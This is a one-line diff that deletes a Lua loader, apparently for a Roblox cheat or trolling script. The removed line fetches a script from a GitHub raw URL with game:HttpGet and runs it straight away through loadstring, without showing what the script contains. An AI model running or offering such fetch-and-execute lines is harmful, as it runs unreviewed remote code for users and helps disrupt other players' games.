@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/troll-hug-tower-spam6-255pqsl2ntna3j.lua"))()
